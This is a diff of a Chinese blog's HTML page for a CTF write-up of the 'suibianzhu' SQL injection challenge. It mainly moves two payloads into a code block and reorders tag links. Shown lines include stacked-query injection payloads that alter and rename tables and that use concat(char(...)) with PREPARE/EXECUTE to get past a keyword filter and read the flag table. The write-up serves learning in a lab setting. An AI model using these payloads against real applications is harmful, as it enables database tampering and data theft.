@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="夢の此夜亭🌸">
 <meta property="og:description" content="进入题目页面有一个输入框和按钮，html代码里说sqlmap是没有灵魂的，因此手动注入。 思路常规思路，有绕过尝试绕过，无法绕过可以重命名。 writeup1.输入 1返回 2.输入’报错，为字符型注入。 3.输入’ or 1# 1234567891011121314151617181920array(2) &amp;#123;  [0]=&amp;gt;  string(1) &amp;quot;1&amp;quot;  [1">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-10-20T04:41:21.019Z">
+<meta property="og:updated_time" content="2020-03-25T02:02:34.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUU 2019&#x2F;10&#x2F;19 随便注">
 <meta name="twitter:description" content="进入题目页面有一个输入框和按钮，html代码里说sqlmap是没有灵魂的，因此手动注入。 思路常规思路，有绕过尝试绕过，无法绕过可以重命名。 writeup1.输入 1返回 2.输入’报错，为字符型注入。 3.输入’ or 1# 1234567891011121314151617181920array(2) &amp;#123;  [0]=&amp;gt;  string(1) &amp;quot;1&amp;quot;  [1">
@@ -209,9 +209,10 @@
 <p>只有flag一个column<br>‘;alter table <code>1919810931114514</code> change flag id varchar(100);# 【一定要加变量类型】<br>‘;rename table words to word,<code>1919810931114514</code> to words;#<br>‘ or 1;#<br>得到flag。</p>
 <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
 <li><strong>concat拼接</strong></li>
-<li><strong>SQL预处理</strong></li>
+<li><strong>SQL预处理</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);PREPARE sqla from @sql;EXECUTE sqla;#</span><br><span class="line">&apos;;set @sisi=concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);prepare sqla from @sisi;execute sqla;#</span><br></pre></td></tr></table></figure>
+
+</li>
 </ol>
-<p>‘;SET @sql=concat(char(115,101,108,101,99,116),” * from <code>1919810931114514</code>“);PREPARE sqla from @sql;EXECUTE sqla;#<br>‘;set @sisi=concat(char(115,101,108,101,99,116),” * from <code>1919810931114514</code>“);prepare sqla from @sisi;execute sqla;#</p>
 
       
 
@@ -506,11 +507,11 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -526,19 +527,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">bugku</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">大物</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">复变</a>
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -546,7 +539,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">大物</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">模电</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">复变</a>
               </li>
              
               <li class="article-tag-list-item">
